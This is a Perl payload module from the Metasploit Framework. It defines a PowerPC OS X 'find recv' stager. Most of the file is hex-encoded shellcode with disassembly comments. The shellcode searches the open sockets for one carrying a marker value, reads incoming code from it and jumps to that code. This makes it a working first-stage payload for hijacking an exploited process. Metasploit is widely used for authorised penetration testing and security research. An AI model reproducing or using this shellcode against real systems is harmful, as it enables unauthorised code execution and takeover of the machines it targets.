###############
##
#
#    Name: FindStager.pm
# Version: $Revision$
#  Source: src/shellcode/osx/ppc/stager_sock_find.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      PowerPC find recv stager for OSX.
#
##
###############


package Msf::PayloadComponent::OSX::ppc::FindRecvStager;

use strict;
use base 'Msf::PayloadComponent::OSX::FindRecvStager';

my $info =
{
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'         => [ 'ppc' ],
    'Priv'         => 0,
    'OS'           => [ 'osx' ],
    'Multistage'   => 1,      
    'Size'         => '',
    'Payload' =>
    {   
        Offsets => { },   
        Payload =>
		pack("N*",
			0x3ba00fff,     # 0x1db8 <main>:          li      r29,4095
			0x3bc00fff,     # 0x1dbc <main+4>:        li      r30,4095
			0x379df002,     # 0x1dc0 <main+8>:        addic.  r28,r29,-4094
			0x7fdcf051,     # 0x1dc4 <findsock>:      subf.   r30,r28,r30
			0x4180fff0,     # 0x1dc8 <findsock+4>:    blt+    0x1db8 <main>
			0x381df067,     # 0x1dcc <findsock+8>:    addi    r0,r29,-3993
			0x7fc3f378,     # 0x1dd0 <findsock+12>:   mr      r3,r30
			0x3881eff8,     # 0x1dd4 <findsock+16>:   addi    r4,r1,-4104
			0x38a00fff,     # 0x1dd8 <findsock+20>:   li      r5,4095
			0x38ddf081,     # 0x1ddc <findsock+24>:   addi    r6,r29,-3967
			0x44ffff02,     # 0x1de0 <findsock+28>:   sc
			0x7cc63279,     # 0x1de4 <findsock+32>:   xor.    r6,r6,r6
			0xa361eff8,     # 0x1de8 <findsock+36>:   lhz     r27,-4104(r1)
			0x2c1b1337,     # 0x1dec <findsock+40>:   cmpwi   r27,4919
			0x4082ffd4,     # 0x1df0 <findsock+44>:   bne+    0x1dc4 <findsock>
			0x3881effc,     # 0x1df4 <gotsock>:       addi    r4,r1,-4100
			0x7c8903a6,     # 0x1df8 <gotsock+4>:     mtctr   r4
			0x4c810420,     # 0x1dfc <gotsock+8>:     blectr
			0x7cc63279,     # 0x1e00 <gotsock+12>:    xor.    r6,r6,r6
			 ),
    },
};


sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
